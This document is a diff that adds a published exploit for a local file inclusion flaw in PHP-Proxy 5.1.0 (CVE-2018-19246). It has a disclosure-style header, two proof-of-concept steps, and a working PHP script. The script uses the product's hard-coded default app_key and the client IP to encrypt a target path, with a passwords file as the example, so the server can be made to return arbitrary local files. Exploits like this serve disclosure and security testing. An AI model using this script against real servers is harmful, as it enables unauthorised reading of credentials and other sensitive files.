@@ -1,0 +1,47 @@
+# Exploit Title: PHP-Proxy 5.1.0 - Local File Inclusion
+# Date: 2018-11-13
+# Exploit Author: Ameer Pornillos
+# Contact: https://ethicalhackers.club
+# Vendor Homepage: https://www.php-proxy.com/
+# Software Link: https://www.php-proxy.com/download/php-proxy.zip
+# Version: 5.1.0
+# Category: Webapps
+# Tested on: XAMPP on Win10_x64
+# Description: Downloadable pre-installed version of PHP-Proxy 5.1.0 
+# make use of a default app_key wherein can be used for local file inclusion
+# attacks. This can be used to generate encrypted string which 
+# can gain access to arbitrary local files in the server.
+# http://php-proxy-site/index.php?q=[encrypted_string_value]
+# CVE: CVE-2018-19246
+
+# POC: 
+# 1)
+# Generate encrypted string value using the PHP script below
+# 2)
+# Browse to URL 
+# http://php-proxy-site/index.php?q=[encrypted_string_value]
+# to read local file
+
+<?php
+$file = "file:///C:/xampp/passwords.txt"; //example target file to read
+$ip = "192.168.0.1"; //change depending on your IP address that access the app
+$app_key = "aeb067ca0aa9a3193dce3a7264c90187";
+$key = md5($app_key.$ip);
+function str_rot_pass($str, $key, $decrypt = false){
+    $key_len = strlen($key);
+    $result = str_repeat(' ', strlen($str));
+    for($i=0; $i<strlen($str); $i++){
+        if($decrypt){
+            $ascii = ord($str[$i]) - ord($key[$i % $key_len]);
+        } else {
+            $ascii = ord($str[$i]) + ord($key[$i % $key_len]);
+        }
+        $result[$i] = chr($ascii);
+    }
+    return $result;
+}
+function base64_url_encode($input){
+    return rtrim(strtr(base64_encode($input), '+/', '-_'), '=');
+}
+echo base64_url_encode(str_rot_pass($file, $key));
+?>
